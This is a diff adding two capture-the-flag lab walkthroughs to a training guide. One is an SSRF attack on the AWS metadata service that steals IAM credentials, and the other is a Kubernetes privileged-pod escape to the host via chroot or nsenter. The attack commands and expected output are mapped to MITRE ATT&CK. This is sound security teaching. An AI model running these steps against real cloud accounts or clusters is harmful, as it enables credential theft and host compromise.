@@ -2302,7 +2302,322 @@ Get-Content "C:\Users\Administrator\Desktop\flag.txt"
 
 ---
 
-<!-- CC-01..03 kill-chains appended by Plan 04 -->
+### CC-01: AWS IMDS SSRF and IAM Credential Theft
+
+**VMs:** Attacker (Kali), Victim (Ubuntu 22.04 — Flask SSRF app :5000 + IMDS mock :80 on 169.254.169.254)
+**Difficulty:** Easy
+**Flags:** 1
+
+You exploit a Server-Side Request Forgery vulnerability in a Flask web application to reach the
+EC2 Instance Metadata Service (IMDS) endpoint at `169.254.169.254`, steal IAM role credentials,
+then use those credentials to query a fake S3 bucket containing the flag — demonstrating the
+complete SSRF → credential theft → cloud API abuse chain (T1552.005).
+
+> **VM configuration note:** The IMDS mock server is bound to `169.254.169.254:80` via the
+> loopback interface (`ip addr add 169.254.169.254/32 dev lo`). This is a VM pre-configuration
+> step performed by the instructor — **not a student action**. The student's entry point is the
+> Flask SSRF app on port 5000.
+
+---
+
+#### Stage 1: Application Recon and SSRF Endpoint Discovery
+
+**Action:** You probe the victim web application to discover the SSRF-vulnerable endpoint that
+accepts a user-controlled URL parameter and makes server-side HTTP requests on your behalf.
+
+**Command:**
+```bash
+# Enumerate open ports and services
+nmap -sV -p 5000,8000,80 VICTIM_IP
+
+# Probe the Flask application for SSRF-susceptible endpoints
+curl http://VICTIM_IP:5000/
+curl http://VICTIM_IP:5000/fetch?url=http://VICTIM_IP:5000/
+```
+
+**Expected Output:**
+```
+5000/tcp open  http    Werkzeug/3.x Python/3.x
+...
+Fetched content from http://VICTIM_IP:5000/
+```
+
+**TTP:** [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · Initial Access
+
+---
+
+#### Stage 2: SSRF Verification
+
+**Action:** You confirm the server-side request forgery by instructing the Flask app to fetch a
+URL that only a server-side process could reach, verifying that the application blindly forwards
+requests to your supplied URL parameter.
+
+**Command:**
+```bash
+# Confirm SSRF by fetching the IMDS root — only reachable server-side via 169.254.x.x
+curl "http://VICTIM_IP:5000/fetch?url=http://169.254.169.254/"
+```
+
+**Expected Output:**
+```
+latest
+```
+
+**TTP:** [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · Initial Access
+
+---
+
+#### Stage 3: IMDS Credential Theft
+
+**Action:** You enumerate the IAM role name attached to the instance, then steal the full
+temporary IAM credential set from the IMDS security credentials path — the cloud equivalent
+of reading `/etc/shadow`.
+
+**Command:**
+```bash
+# Step 1: Discover the IAM role name
+curl "http://VICTIM_IP:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# Response: ec2-lab-role  (use this value for IAM_ROLE_NAME)
+
+# Step 2: Steal the credential JSON for the role
+curl "http://VICTIM_IP:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_ROLE_NAME"
+```
+
+**Expected Output:**
+```json
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "IQoJb3JpZ2...",
+  "Expiration": "2026-01-01T12:00:00Z"
+}
+```
+
+**TTP:** [T1552.005 — Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/) · Credential Access
+
+---
+
+#### Stage 4: Credential Export and AWS CLI Configuration
+
+**Action:** You export the stolen IAM role credentials as environment variables so that the
+AWS CLI will use them automatically, impersonating the EC2 instance's cloud identity.
+
+**Command:**
+```bash
+export AWS_ACCESS_KEY_ID=STOLEN_ACCESS_KEY_ID
+export AWS_SECRET_ACCESS_KEY=STOLEN_SECRET_ACCESS_KEY
+export AWS_SESSION_TOKEN=STOLEN_SESSION_TOKEN
+
+# Verify the credentials are accepted
+aws sts get-caller-identity --endpoint-url http://VICTIM_IP:8000
+```
+
+**Expected Output:**
+```json
+{
+    "UserId": "AROA...",
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/ec2-lab-role/i-..."
+}
+```
+
+**TTP:** [T1078.004 — Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) · Initial Access
+
+---
+
+#### Stage 5: Fake S3 Bucket Enumeration
+
+**Action:** You use the stolen IAM credentials to query the victim VM's local fake S3 endpoint,
+enumerating the flag bucket to identify the flag object.
+
+**Command:**
+```bash
+aws s3 ls s3://flag-bucket --endpoint-url http://VICTIM_IP:8000
+```
+
+**Expected Output:**
+```
+2026-01-01 00:00:00        42 flag.txt
+```
+
+**TTP:** [T1078.004 — Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) · Initial Access
+
+---
+
+### [FLAG 1] Stage 6: Flag Capture — S3 Object Download
+
+**Action:** You retrieve Flag 1 by downloading the flag object from the fake S3 bucket using
+the stolen IAM credentials.
+
+**Command:**
+```bash
+aws s3 cp s3://flag-bucket/flag.txt /tmp/flag.txt --endpoint-url http://VICTIM_IP:8000
+cat /tmp/flag.txt
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** — (flag capture, not an adversarial technique)
+
+---
+
+### CC-03: Kubernetes Misconfigured Service Account Escape
+
+**VMs:** Attacker (Kali), Victim (Ubuntu 22.04, k3s, misconfigured privileged pod with hostPath mount)
+**Difficulty:** Hard
+**Flags:** 1
+
+You receive a kubeconfig granting exec rights to a specific namespace but not cluster-admin.
+By enumerating pods, you locate a misconfigured privileged pod with a hostPath mount exposing
+the underlying node's root filesystem, exec into it, and use `chroot /host` to break out of
+the container boundary and read the flag directly from the host node — without creating any
+new pods (your RBAC permits exec only).
+
+---
+
+#### Stage 1: Cluster Enumeration
+
+**Action:** You enumerate all pods across namespaces to map the cluster and identify candidates
+for privilege escalation.
+
+**Command:**
+```bash
+# List all pods across all namespaces
+kubectl get pods -A
+
+# Narrow to the target namespace
+kubectl get pods -n TARGET_NAMESPACE
+```
+
+**Expected Output:**
+```
+NAMESPACE        NAME                        READY   STATUS    RESTARTS   AGE
+TARGET_NAMESPACE privileged-host-pod-xxxxx   1/1     Running   0          5m
+kube-system      coredns-xxx-yyy             1/1     Running   0          1h
+```
+
+**TTP:** [T1613 — Container and Resource Discovery](https://attack.mitre.org/techniques/T1613/) · Discovery
+
+> **Note on T1613 mapping:** T1613 (Container and Resource Discovery) is the preferred mapping
+> for Kubernetes pod enumeration over T1087.001 (Local Account Discovery). T1613 specifically
+> covers adversary enumeration of container orchestration resources — pods, services, and
+> namespaces — whereas T1087.001 is scoped to account discovery on individual hosts. When the
+> primary goal is identifying misconfigured pods and their privilege settings, T1613 is the
+> correct technique.
+
+---
+
+#### Stage 2: Identify Misconfigured Privileged Pod
+
+**Action:** You inspect the pod specification to confirm it runs with `privileged: true` and
+mounts the host root filesystem via a hostPath volume — the two conditions required for a
+container-to-host escape.
+
+**Command:**
+```bash
+kubectl get pod PRIVILEGED_POD_NAME -o yaml -n TARGET_NAMESPACE | grep -A5 "securityContext\|hostPath\|privileged"
+
+# Alternative:
+kubectl describe pod PRIVILEGED_POD_NAME -n TARGET_NAMESPACE
+```
+
+**Expected Output:**
+```yaml
+    securityContext:
+      privileged: true
+  volumes:
+  - hostPath:
+      path: /
+```
+
+**TTP:** [T1613 — Container and Resource Discovery](https://attack.mitre.org/techniques/T1613/) · Discovery
+
+---
+
+#### Stage 3: Pod Exec
+
+**Action:** You exec into the privileged pod using your kubeconfig's granted exec rights,
+obtaining an interactive shell inside the misconfigured container.
+
+**Command:**
+```bash
+kubectl exec -it PRIVILEGED_POD_NAME -n TARGET_NAMESPACE -- bash
+```
+
+**Expected Output:**
+```
+root@PRIVILEGED_POD_NAME:/#
+```
+
+**TTP:** [T1609 — Container Administration Command](https://attack.mitre.org/techniques/T1609/) · Execution
+
+---
+
+#### Stage 4: Host Filesystem Access via chroot
+
+**Action:** You escape the container boundary by chrooting into the hostPath mount at `/host`,
+which exposes the full node root filesystem as if you were running natively on the host.
+
+**Command:**
+```bash
+# Primary: chroot into the host root exposed via hostPath mount
+chroot /host /bin/bash
+
+# Alternative (if hostPID is also enabled — direct namespace entry):
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+```
+
+**Expected Output:**
+```
+root@PRIVILEGED_POD_NAME:/#
+```
+*(Prompt unchanged but you now have the host's filesystem view — verify with `ls /etc/hostname`)*
+
+**TTP:** [T1611 — Escape to Host](https://attack.mitre.org/techniques/T1611/) · Privilege Escalation
+
+---
+
+#### Stage 5: Node Filesystem Exploration
+
+**Action:** You explore the host node's filesystem to confirm you have escaped the container
+and to locate the flag.
+
+**Command:**
+```bash
+# Confirm host escape (hostname will differ from the pod name)
+hostname
+cat /etc/os-release
+
+# Explore sensitive host locations
+ls /root/
+ls /etc/kubernetes/
+```
+
+**Expected Output:**
+```
+ubuntu-node
+NAME="Ubuntu"
+VERSION="22.04.x LTS (Jammy Jellyfish)"
+flag.txt  snap
+```
+
+**TTP:** [T1083 — File and Directory Discovery](https://attack.mitre.org/techniques/T1083/) · Discovery
+
+---
+
+### [FLAG 1] Stage 6: Flag Capture — Host Node /root/flag.txt
+
+**Action:** You retrieve Flag 1 from the host node's root home directory, confirming that you
+have fully escaped the container and have root access to the underlying Kubernetes node.
+
+**Command:**
+```bash
+cat /root/flag.txt
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** — (flag capture, not an adversarial technique)
 
 ---
 
